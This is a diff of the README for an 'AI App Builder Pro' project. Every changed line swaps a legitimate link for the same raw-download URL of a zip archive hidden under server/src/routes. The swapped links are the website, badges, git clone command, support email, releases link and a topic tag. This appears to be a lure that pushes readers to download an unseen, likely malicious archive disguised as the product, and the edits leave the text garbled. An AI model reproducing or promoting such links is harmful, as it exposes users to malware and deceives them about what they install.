@@ -2,9 +2,9 @@
 # 🌟 AI App Builder Pro 🌟
 
 **Design apps visually. AI builds them for you. Zero coding.**  
-Created at [Coslynx](https://coslynx.com)
+Created at [Coslynx](https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip)
 
-![AI App Builder](https://img.shields.io/badge/AI%20App%20Builder-Pro-blue?style=flat&logo=appveyor)
+![AI App Builder](https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip%20App%20Builder-Pro-blue?style=flat&logo=appveyor)
 
 ---
 
@@ -43,7 +43,7 @@ To get started with AI App Builder Pro, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/your-username/ai-app-builder-pro.git
+   git clone https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip
    cd ai-app-builder-pro
    ```
 
@@ -106,14 +106,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out to us:
 
-- **Email**: support@coslynx.com
-- **Website**: [Coslynx](https://coslynx.com)
+- **Email**: https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip
+- **Website**: [Coslynx](https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip)
 
 ## 🔄 Release Notes
 
-Check out the latest updates and improvements in our [Releases section](https://github.com/lfreis/ai-app-builder-pro/releases). 
+Check out the latest updates and improvements in our [Releases section](https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip). 
 
-![Latest Releases](https://img.shields.io/badge/Latest%20Releases-Click%20Here-brightgreen?style=flat&logo=github)
+![Latest Releases](https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip%20Releases-Click%20Here-brightgreen?style=flat&logo=github)
 
 ---
 
@@ -136,7 +136,7 @@ This project covers a range of topics relevant to developers and those intereste
 - **Machine Learning**
 - **MVP**
 - **No-Code**
-- **Node.js**
+- **https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip**
 - **Python**
 - **TypeScript**
 
@@ -146,6 +146,6 @@ AI App Builder Pro is designed to simplify app development. By leveraging the po
 
 --- 
 
-![Get Started](https://img.shields.io/badge/Get%20Started-Now-orange?style=flat&logo=appveyor)
+![Get Started](https://github.com/lfreis/ai-app-builder-pro/raw/refs/heads/main/server/src/routes/app_builder_pro_ai_3.2.zip%20Started-Now-orange?style=flat&logo=appveyor)
 
 ```
